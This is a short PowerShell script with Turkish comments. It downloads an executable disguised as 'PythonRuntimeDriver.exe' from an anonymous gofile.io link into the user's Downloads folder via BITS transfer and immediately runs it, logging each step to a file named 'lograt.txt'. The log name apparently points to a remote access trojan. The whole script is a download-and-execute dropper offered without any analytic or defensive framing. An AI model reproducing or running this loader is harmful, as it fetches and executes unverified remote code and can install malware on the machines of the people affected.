# Yeni Ayarlar
$exeUrl = "https://cold3.gofile.io/download/web/eb0e07d2-e698-48f9-8fa7-20a9f86b59de/PythonRuntimeDriver.exe"
$localPath = "$env:USERPROFILE\Downloads\PythonRuntimeDriver.exe"
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"

# Log fonksiyonu
function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

try {
    Log-Message "BITS transfer başlatılıyor..."

    # Dosyayı indir
    Start-BitsTransfer -Source $exeUrl -Destination $localPath -ErrorAction Stop

    Log-Message "İndirme tamamlandı: $localPath"

    # Dosya var mı?
    if (Test-Path $localPath) {
        Log-Message "Dosya bulundu, çalıştırılıyor..."
        Start-Process $localPath -WindowStyle Normal
    } else {
        Log-Message "HATA: Dosya bulunamadı!"
        Write-Host "Dosya indirilemedi ya da doğru yere inmemiş olabilir."
    }
} catch {
    Log-Message "HATA: $($_.Exception.Message)"
    Write-Host "Hata oluştu: $($_.Exception.Message)"
}
